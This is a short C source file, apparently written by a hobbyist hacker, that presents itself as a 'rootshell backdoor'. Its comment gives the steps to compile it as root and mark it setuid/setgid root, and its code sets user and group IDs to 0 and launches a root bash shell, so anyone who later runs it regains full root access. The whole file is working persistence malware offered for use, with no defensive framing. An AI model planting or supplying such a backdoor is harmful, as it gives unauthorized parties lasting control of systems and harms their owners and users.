/* This is my First attempt at coding a rootshell backdoor.
 * This file is really simple.  It allows a user to become 
 * root by running this file.
 *
 *  As root, type gcc -o door door.c
 *  then chmod 06711 door
 *  type exit, and dot slash door
 *
 *  EPiC [H3C]
 *
 * 
 * */


#include <stdio.h>
int main(void) {  
    setuid(0);    
    setgid(0);    
    execl("/bin/bash", "-bash", NULL);
    return 0;
}
